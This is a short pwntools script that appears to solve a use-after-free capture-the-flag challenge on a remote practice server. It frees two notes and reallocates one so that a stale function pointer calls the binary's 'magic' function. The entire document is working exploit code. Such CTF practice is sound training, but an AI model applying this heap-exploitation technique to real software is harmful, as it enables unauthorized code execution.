from pwn import *
r=remote("ctf.j0n9hyun.xyz",3020)
#r=process("./uaf")
b=ELF("./uaf")

context.log_level='debug'
def add_note(size,content):
    r.sendafter("입력 :","1")
    r.sendafter("노트 크기 :",size)
    r.sendafter("내용 :",content)
def delete_note(index):
    r.sendafter("입력 :","2")
    r.sendafter("Index ",index)
def print_content(index):
    r.sendafter("입력 :","3")
    r.sendafter("Index :",index)
add_note("16","snwo.tistory.com")
add_note("16","github.com/snwox")
delete_note("0")
delete_note("1")

pay=p32(b.symbols['magic'])
add_note("8",pay)
print_content('0')
r.sendline("4") # bye ~~
r.interactive()
